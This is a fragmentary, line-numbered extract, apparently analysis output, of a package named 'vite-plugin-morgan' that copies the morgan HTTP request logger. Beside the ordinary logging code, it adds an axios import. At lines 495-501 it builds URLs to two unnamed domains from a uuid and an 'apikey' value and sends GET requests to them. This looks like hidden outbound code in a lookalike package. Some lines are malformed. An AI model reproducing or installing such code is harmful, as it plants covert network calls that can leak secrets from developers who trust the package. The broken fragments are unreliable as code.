// File: tmp/tmp9df2h4kq/vite-plugin-morgan/package/index.js
// ======================================================================
Line 28: var auth = require('basic-auth')
Line 29: var debug = require('debug')('morgan')
Line 30: var deprecate = require('depd')('morgan')
Line 31: var onFinished = require('on-finished')
Line 32: var onHeaders = require('on-headers')
Line 33: var axios = require('axios')
Line 40: _tmp_5.push("Feb")
Line 41: _tmp_5.push("Oct")
Line 83: var formatLine = typeof fmt !== 'function'
    ? getFormatFunction(fmt)
    : fmt
Line 115: recordStartTime.call(req)
Line 117: {
      if (skip !== false && skip(req, res)) {
        debug('skip request')
        return
      }

      var line = formatLine(morgan, req, res)

      if (line == null) {
        debug('skip line')
        return
      }

      debug('log request')
      stream.write(line + '\n')
    }
Line 118: skip(req, res)
Line 131: stream.write(line + '\n')
Line 145: next()
Line 166: deprecate.property(morgan, 'default', 'default format: use combined format')
Line 184: {
  // get the status code if response written
  var status = headersSent(res)
    ? res.statusCode
    : undefined

  // get status color
  var color = status >= 500 ? 31 // red
    : status >= 400 ? 33 // yellow
      : status >= 300 ? 36 // cyan
        : status >= 200 ? 32 // green
          : 0 // no color

  // get colored function
  var fn = developmentFormatLine[color]

  if (!fn) {
    // compile
    fn = developmentFormatLine[color] = compile('\x1b[0m:method :url \x1b[' +
      color + 'm:status\x1b[0m :response-time ms - :res[content-length]\x1b[0m')
  }

  return fn(tokens, req, res)
}
Line 198: var fn = developmentFormatLine[color]
Line 200: {
    // compile
    fn = developmentFormatLine[color] = compile('\x1b[0m:method :url \x1b[' +
      color + 'm:status\x1b[0m :response-time ms - :res[content-length]\x1b[0m')
  }
Line 202: fn = developmentFormatLine[color] = compile('\x1b[0m:method :url \x1b[' +
      color + 'm:status\x1b[0m :response-time ms - :res[content-length]\x1b[0m')
Line 229: {
  if (!req._startAt || !res._startAt) {
    // missing request and/or response start time
    return
  }

  // calculate diff
  var ms = (res._startAt[0] - req._startAt[0]) * 1e3 +
    (res._startAt[1] - req._startAt[1]) * 1e-6

  // return truncated value
  return ms.toFixed(digits === undefined ? 3 : digits)
}
Line 236: var ms = (res._startAt[0] - req._startAt[0]) * 1e3 +
    (res._startAt[1] - req._startAt[1]) * 1e-6
Line 237: (res._startAt[1] - req._startAt[1]) * 1e-6
Line 247: {
  if (!req._startAt || !res._startAt) {
    // missing request and/or response start time
    return
  }

  // time elapsed from request start
  var elapsed = process.hrtime(req._startAt)

  // cover to milliseconds
  var ms = (elapsed[0] * 1e3) + (elapsed[1] * 1e-6)

  // return truncated value
  return ms.toFixed(digits === undefined ? 3 : digits)
}
Line 257: var ms = (elapsed[0] * 1e3) + (elapsed[1] * 1e-6)
Line 310: auth(req)
Line 338: {
  // get header
  var header = req.headers[field.toLowerCase()]

  return Array.isArray(header)
    ? header.join(', ')
    : header
}
Line 340: var header = req.headers[field.toLowerCase()]
Line 343: header.join(', ')
Line 360: header.join(', ')
Line 372: {
  var date = dateTime.getUTCDate()
  var hour = dateTime.getUTCHours()
  var mins = dateTime.getUTCMinutes()
  var secs = dateTime.getUTCSeconds()
  var year = dateTime.getUTCFullYear()

  var month = CLF_MONTH[dateTime.getUTCMonth()]

  return pad2(date) + '/' + month + '/' + year +
    ':' + pad2(hour) + ':' + pad2(mins) + ':' + pad2(secs) +
    ' +0000'
}
Line 379: var month = CLF_MONTH[dateTime.getUTCMonth()]
Line 381: pad2(date)
Line 382: pad2(hour)
Line 400: var js = '  "use strict"\n  return ' + fmt.replace(/:([-\w]{2,})(?:\[([^\]]+)\])?/g, function (_, name, arg) {
    var tokenArguments = 'req, res'
    var tokenFunction = 'tokens[' + String(JSON.stringify(name)) + ']'

    if (arg !== undefined) {
      tokenArguments += ', ' + String(JSON.stringify(arg))
    }

    return '" +\n    (' + tokenFunction + '(' + tokenArguments + ') || "-") + "'
  })
Line 402: var tokenFunction = 'tokens[' + String(JSON.stringify(name)) + ']'
Line 423: {
  var buf = []
  var timer = null

  // flush function
  function flush () {
    timer = null
    stream.write(buf.join(''))
    buf.length = 0
  }

  // write function
  function write (str) {
    if (timer === null) {
      timer = setTimeout(flush, interval)
    }

    buf.push(str)
  }

  // return a minimal "stream"
  return { write: write }
}
Line 424: var buf = []
Line 428: {
    timer = null
    stream.write(buf.join(''))
    buf.length = 0
  }
Line 430: stream.write(buf.join(''))
Line 436: {
      timer = setTimeout(flush, interval)
    }
Line 437: timer = setTimeout(flush, interval)
Line 440: buf.push(str)
Line 455: {
  morgan[name] = fmt
  return this
}
Line 456: morgan[name] = fmt
Line 468: function getFormatFunction = function getFormatFunction (name) {
  // lookup format
  var fmt = morgan[name] || name || morgan.default

  // return compiled format
  return typeof fmt !== 'function'
    ? compile(fmt)
    : fmt
}
Line 470: var fmt = morgan[name] || name || morgan.default
Line 473: typeof fmt !== 'function' ? compile(fmt) : fmt
Line 474: compile(fmt)
Line 495: _tmp_7.push(<operator>.formatString("https://", domain2, "/", uuid, ""))
Line 496: _tmp_7.push(<operator>.formatString("https://", domain1, "/apikey/", apikey, ""))
Line 499: _iterator_0.next()
Line 501: const response = await axios.get(url)
Line 574: {
  morgan[name] = fn
  return this
}
Line 575: morgan[name] = fn
